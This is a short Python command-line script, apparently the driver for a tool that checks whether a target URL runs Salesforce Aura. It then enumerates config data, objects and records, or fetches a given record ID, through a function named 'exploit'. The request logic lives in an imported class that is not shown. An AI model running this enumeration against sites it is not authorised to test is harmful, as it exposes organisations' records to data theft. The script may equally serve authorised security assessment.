import sys
import optparse

from classes.SFAura import SFAura

from helpers.utils import create_folder_structure, normalize_url
from helpers.cache import check_cache

def menu():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest="url", help='Target URL')
    parser.add_option('-r', '--record', dest="record", help='ID of the record needed')

    options, args = parser.parse_args()
    globals().update(locals())

def exploit():
    if not options.url:
        sys.exit("URL is required")

    target = normalize_url(options.url)

    folder = create_folder_structure(target)
    cache = check_cache(path=folder, url=target)

    url = SFAura(url=target, folder=folder)

    if not cache:
        is_salesforce = url.is_salesforce_aura()

        if not is_salesforce:
            sys.exit("The provided url is not using salesforce solution")
        
        url.retrive_fwuid()
    else:
        url.update_scope_from_cache(fwuid=cache["fwuid"], endpoint=cache["endpoint"])

    if options.record:
        url.get_item_record(options.record)
        return 

    config_data = url.get_config_data()

    url.get_csp_trusted_urls(config_data)

    objects = url.get_objects(config_data)

    url.get_objects_items(objects)

menu()
exploit()
